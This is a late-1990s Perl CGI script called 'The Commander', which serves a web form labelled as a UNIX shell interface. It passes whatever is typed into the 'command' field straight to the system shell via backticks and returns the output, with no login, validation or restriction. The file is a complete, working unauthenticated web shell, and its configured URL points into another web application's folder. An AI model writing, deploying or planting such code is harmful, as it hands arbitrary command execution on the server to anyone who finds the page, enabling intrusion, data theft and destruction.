#!/usr/bin/perl

### Change the first line above to point to your server's Perl interpreter.

####################################################################
#                                                                  #
#   Copyright (c) 1998-1999 CGI City (http://icthus.net/CGI-City/  #
#   Author:  Erik Lacson (eglacson@yahoo.com)                      #
#   This script was written on May 16, 1998                        #
#   Download this sript from CGI City (http://icthus.net/CGI-City) #
#                                                                  #
#   This script may be used/modified for personal use              #
#   as long as this copyright notice is kept unchanged.            #
#   If you use this code, please inform me by sending an email.    #
#   You may not sell this code or otherwise profit from its use    #
#   without CGI City's expressed permission.                       #
#                                                                  #
#   WARNING: Use this script with caution. Depending on how        #
#   your server permissions are set up, inadvertent deletion       #
#   of important files is a strong possibility.                    #
#                                                                  #
####################################################################
#                                                                  #
#  DISCLAIMER:                                                     #
#  In no event will CGI City be liable to the user of this script  #
#  or any third party for any damages, including any lost profits, #
#  lost savings or other incidental, consequential or special      #
#  damages arising out of the operation of or inability to operate #
#  this script, even if user has been advised of the possibility   #
#  of such damages.                                                #
#                                                                  #
####################################################################

### Place both commander.pl and cgi-lib.pl in your cgi-bin directory.
### Both need to be chmod 755.
###
### You need to change the next line to point to your own URL.
### This is the only change you need to make.

$me = "http://www.eqguilded.com/fly-1.6.5/commander.pl";

################################################
#    DO NOT EDIT ANYTHING BEYOND THIS LINE     #
################################################
push (@INC,"../perl-lib");
require 'cgi-lib.pl';
&ReadParse(*form_data);
$command = $form_data{'command'};
$result = `$command`;
print &PrintHeader;

print<<"tab1";
<HTML>
<BODY BGCOLOR=FFFFFF>
<CENTER>
<TABLE BORDER=0 WIDTH=600 CELLSPACING=10>
<TR>
	<TD WIDTH =20></TD>
	<TD ALIGN=CENTER WIDTH =580>
	<FONT FACE="arial" SIZE=+2><B>THE COMMANDER</B></FONT>
	<BR>
	<FONT FACE="arial"><B>Web-Based UNIX Shell Interface</B></FONT>
	<BR>
	<FONT FACE="arial">Non-Interactive Commands Only</FONT>
	<HR>
	</TD>
	<TD WIDTH =20></TD>
</TR>

<TR>
	<TD WIDTH =100></TD>
	<TD WIDTH=400>
	<FORM ACTION=$me METHOD=POST>
	<FONT FACE="arial" SIZE=+1><B>Enter UNIX command:</B></FONT>
	<BR>
	<INPUT TYPE="text" NAME="command" SIZE=42>
	<BR><BR>
	<INPUT TYPE="submit"><INPUT TYPE="reset">
	
	</TD>
	<TD WIDTH =100></TD>
</TR>

<TR>
	<TD WIDTH =100></TD>
	<TD WIDTH =100>
	<HR>
	<FONT FACE="arial" SIZE=+1><B>Output:</B></FONT>
	</TD>
	<TD WIDTH =100></TD>
</TR>

<TR>
	<TD WIDTH =100></TD>
	<TD WIDTH =100 BGCOLOR=CCCCCC>
	<BR>
	<PRE>
	$result
	</PRE>
	<BR><BR>
	</TD>
	<TD WIDTH =100></TD>
</TR>
</TABLE>
</FORM>
<BR><HR NOSHADE WIDTH=600>
<FONT FACE=ARIAL SIZE=-1>The Commander &copy 1998-1999 <A HREF=http://icthus.net/CGI-City>CGI City</A></FONT>
<BR><BR><BR><BR>
</BODY>
</HTML>
tab1
